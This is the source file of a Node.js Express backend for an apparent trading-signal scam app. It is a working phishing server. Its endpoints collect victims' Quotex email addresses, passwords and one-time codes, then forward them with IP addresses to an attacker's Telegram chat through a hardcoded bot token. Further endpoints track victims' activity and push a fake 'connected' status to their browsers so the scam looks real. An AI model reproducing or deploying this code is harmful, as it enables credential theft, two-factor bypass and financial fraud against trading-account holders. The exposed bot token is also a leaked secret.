const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();

app.use(cors());
app.use(express.json());

// ================== YOUR TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

// Function to send message
async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "HTML"
        });
        console.log("✅ Message sent to Telegram");
    } catch (error) {
        console.error("❌ Telegram Error:", error.message);
    }
}

// ================== LICENSE + NAME ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const message = `
🔑 <b>New License Activation</b>

👤 Name: <b>${userName}</b>
🔑 License: <b>${licenseKey}</b>
🌍 IP: <b>${ip}</b>
⏰ Time (PKT): <b>${timestamp || new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();

    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', async (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const message = `
📊 <b>User Activity</b>

Action: <b>${action}</b>
👤 Name: <b>${userName || "Unknown"}</b>
🌍 IP: <b>${ip}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();

    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== NOTIFICATION PERMISSION ==================
app.post('/api/notification-permission', async (req, res) => {
    const { userName, permission, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const message = `
🛎️ <b>Notification Permission</b>

👤 Name: <b>${userName}</b>
📱 Status: <b>${permission}</b>
🌍 IP: <b>${ip}</b>
⏰ Time: <b>${timestamp}</b>
    `.trim();

    await sendTelegramMessage(message);
    res.status(200).send({ status: "success" });
});

// ================== QUOTEX LOGIN (PASSWORD FIXED) ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";

    const message = `
🔑 <b>Quotex Login Attempt</b>

📧 Email: <b>${email}</b>
🔑 Password: <b>${password}</b>
🌍 IP: <b>${ip}</b>
⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
    `.trim();

    await sendTelegramMessage(message);
    res.status(200).send({ status: "ok" });
});

app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    await sendTelegramMessage(`🔢 OTP Entered\nEmail: ${email}\nOTP: ${otp}\nIP: ${ip}`);
    res.status(200).send({ status: "ok" });
});

app.get('/', (req, res) => {
    res.send("✅ Chinese Signal Bot Backend Running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
// ================== REAL-TIME PUSH FOR CONNECTED STATUS ==================
let connectedClients = new Set();

app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    const clientId = Date.now();
    connectedClients.add(res);

    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'ready' })}\n\n`);

    req.on('close', () => {
        connectedClients.delete(res);
    });
});

// Admin Trigger from Telegram (You will call this endpoint from Telegram bot)
app.post('/api/trigger-connected', async (req, res) => {
    const { userName } = req.body;

    const message = `🔗 Triggering connection success for ${userName || 'user'}`;

    // Push to all connected clients
    connectedClients.forEach(client => {
        client.write(`data: ${JSON.stringify({ 
            type: 'show_connected', 
            userName: userName 
        })}\n\n`);
    });

    await sendTelegramMessage(message);
    res.send({ status: "triggered" });
});
